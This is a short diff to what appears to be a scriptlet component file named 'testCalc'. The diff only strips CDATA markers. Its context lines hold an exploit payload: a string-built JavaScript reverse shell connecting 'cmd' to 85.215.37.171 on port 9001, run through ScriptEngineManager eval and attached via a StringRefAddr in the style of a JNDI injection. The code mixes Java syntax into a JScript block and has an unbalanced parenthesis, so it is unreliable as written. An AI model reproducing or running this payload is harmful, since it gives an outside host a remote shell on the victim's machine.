@@ -4,7 +4,6 @@
 <component id="testCalc">
 
 <script language="JScript">
-<![CDATA[
 String command = "var host = '85.215.37.171';" +
                        "var port = 9001;" +
                        "var cmd = 'cmd';"+
@@ -34,7 +33,7 @@ String command = "var host = '85.215.37.171';" +
                        "s.close();";
 String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
 ref.add(new StringRefAddr("x", x);
-]]>
+
 </script>
 
 </component>
